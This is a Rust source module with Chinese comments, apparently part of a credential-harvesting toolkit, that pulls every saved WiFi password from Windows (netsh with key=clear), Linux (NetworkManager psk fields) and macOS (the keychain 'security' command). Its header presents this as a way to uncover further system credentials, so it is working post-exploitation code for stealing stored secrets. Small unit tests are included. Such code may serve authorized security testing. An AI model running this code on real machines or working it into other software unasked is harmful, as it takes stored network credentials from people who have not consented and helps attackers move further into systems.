//! WiFi密码提取模块
//!
//! 提取WiFi密码可以发现潜在的其他系统凭据。

use crate::cred::{Credential, CredType};

/// WiFi配置条目
#[derive(Debug, Clone)]
pub struct WifiProfile {
    /// SSID (WiFi名称)
    pub ssid: String,
    /// 安全类型
    pub authentication: String,
    /// 密码
    pub password: String,
}

/// 提取所有已保存的WiFi密码
pub fn extract_wifi_passwords() -> Result<Vec<Credential>, String> {
    let mut credentials = Vec::new();

    // Windows: 使用netsh wlan
    if cfg!(windows) {
        match extract_wifi_passwords_windows() {
            Ok(wifi_creds) => credentials.extend(wifi_creds),
            Err(e) => tracing::debug!("[WiFi密码] Windows提取失败: {}", e),
        }
    }

    // Linux: 读取NetworkManager配置
    if cfg!(unix) {
        match extract_wifi_passwords_linux() {
            Ok(wifi_creds) => credentials.extend(wifi_creds),
            Err(e) => tracing::debug!("[WiFi密码] Linux提取失败: {}", e),
        }
    }

    // macOS: 使用security命令
    if cfg!(target_os = "macos") {
        match extract_wifi_passwords_macos() {
            Ok(wifi_creds) => credentials.extend(wifi_creds),
            Err(e) => tracing::debug!("[WiFi密码] macOS提取失败: {}", e),
        }
    }

    Ok(credentials)
}

/// Windows平台WiFi密码提取
fn extract_wifi_passwords_windows() -> Result<Vec<Credential>, String> {
    let mut credentials = Vec::new();

    // 步骤1：列出所有WiFi配置文件
    let profiles_output = std::process::Command::new("netsh")
        .args(["wlan", "show", "profiles"])
        .output()
        .map_err(|e| format!("netsh执行失败: {}", e))?;

    let stdout = String::from_utf8_lossy(&profiles_output.stdout);

    // 解析SSID列表
    // 格式:    所有用户配置文件 : <SSID>
    let ssid_regex = regex::Regex::new(r"(?:所有用户配置文件|All User Profile)\s*:\s*(.+)")
        .map_err(|e| format!("正则编译失败: {}", e))?;

    let ssids: Vec<String> = ssid_regex
        .captures_iter(&stdout)
        .filter_map(|cap| cap.get(1).map(|m| m.as_str().trim().to_string()))
        .collect();

    tracing::info!("[WiFi密码] 发现 {} 个WiFi配置文件", ssids.len());

    // 步骤2：获取每个SSID的密码
    // 正则只编译一次（所有 profile 格式一致）
    let key_regex = regex::Regex::new(r"(?:关键内容|Key Content)\s*:\s*(.+)")
        .map_err(|_| "正则失败".to_string())?;
    let auth_regex = regex::Regex::new(r"(?:身份验证|Authentication)\s*:\s*(.+)")
        .map_err(|_| "正则失败".to_string())?;

    for ssid in &ssids {
        let key_output = std::process::Command::new("netsh")
            .args(["wlan", "show", "profile", "name=", ssid, "key=clear"])
            .output()
            .map_err(|e| format!("netsh查询失败 ({}): {}", ssid, e))?;

        let key_stdout = String::from_utf8_lossy(&key_output.stdout);

        let password = key_regex
            .captures(&key_stdout)
            .and_then(|cap| cap.get(1))
            .map(|m| m.as_str().trim().to_string())
            .unwrap_or_default();

        let auth = auth_regex
            .captures(&key_stdout)
            .and_then(|cap| cap.get(1))
            .map(|m| m.as_str().trim().to_string())
            .unwrap_or_else(|| "未知".to_string());

        if !password.is_empty() {
            credentials.push(
                Credential::new(CredType::WifiPassword, "WiFi配置文件")
                    .with_target(ssid)
                    .with_password(&password)
                    .with_attribute("authentication", &auth)
                    .with_attribute("source", "netsh wlan show profile")
            );
        }
    }

    Ok(credentials)
}

/// Linux平台WiFi密码提取
fn extract_wifi_passwords_linux() -> Result<Vec<Credential>, String> {
    let mut credentials = Vec::new();

    // NetworkManager存储位置
    let nm_paths = [
        "/etc/NetworkManager/system-connections/",
        "/var/lib/NetworkManager/system-connections/",
    ];

    for nm_path in &nm_paths {
        let path = std::path::Path::new(nm_path);
        if !path.exists() {
            continue;
        }

        if let Ok(entries) = std::fs::read_dir(path) {
            for entry in entries.flatten() {
                let file_path = entry.path();
                if let Ok(content) = std::fs::read_to_string(&file_path) {
                    let ssid = parse_nm_field(&content, "ssid");
                    let psk = parse_nm_field(&content, "psk");

                    if let (Some(ssid), Some(password)) = (ssid, psk) {
                        if !password.is_empty() {
                            credentials.push(
                                Credential::new(CredType::WifiPassword, "NetworkManager")
                                    .with_target(&ssid)
                                    .with_password(&password)
                                    .with_attribute("source", &file_path.to_string_lossy())
                            );
                        }
                    }
                }
            }
        }
    }

    Ok(credentials)
}

/// macOS平台WiFi密码提取
fn extract_wifi_passwords_macos() -> Result<Vec<Credential>, String> {
    let mut credentials = Vec::new();

    // macOS使用security命令和钥匙串
    // 获取AirPort网络密码
    let output = std::process::Command::new("security")
        .args(["find-generic-password", "-wa", "AirPort"])
        .output();

    if let Ok(output) = output {
        if output.status.success() {
            let password = String::from_utf8_lossy(&output.stdout).trim().to_string();
            if !password.is_empty() {
                credentials.push(
                    Credential::new(CredType::WifiPassword, "macOS钥匙串")
                        .with_target("AirPort网络")
                        .with_password(&password)
                );
            }
        }
    }

    Ok(credentials)
}

/// 解析NetworkManager配置字段
fn parse_nm_field(content: &str, field: &str) -> Option<String> {
    for line in content.lines() {
        let line = line.trim();
        if line.starts_with(&format!("{}=", field)) {
            return Some(line[field.len() + 1..].trim().to_string());
        }
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_parse_nm_field() {
        let content = "[wifi]\nssid=MyWiFi\npsk=secret123\n";
        assert_eq!(parse_nm_field(content, "ssid"), Some("MyWiFi".to_string()));
        assert_eq!(parse_nm_field(content, "psk"), Some("secret123".to_string()));
    }

    #[test]
    fn test_parse_nm_field_not_found() {
        let content = "[wifi]\nssid=Test\n";
        assert_eq!(parse_nm_field(content, "psk"), None);
    }

    #[test]
    fn test_wifi_profile_creation() {
        let profile = WifiProfile {
            ssid: "CorporateWiFi".to_string(),
            authentication: "WPA2-Personal".to_string(),
            password: "SecurePass123".to_string(),
        };
        assert_eq!(profile.ssid, "CorporateWiFi");
        assert_eq!(profile.authentication, "WPA2-Personal");
    }

    #[test]
    fn test_extract_wifi_passwords() {
        let result = extract_wifi_passwords();
        assert!(result.is_ok());
    }
}
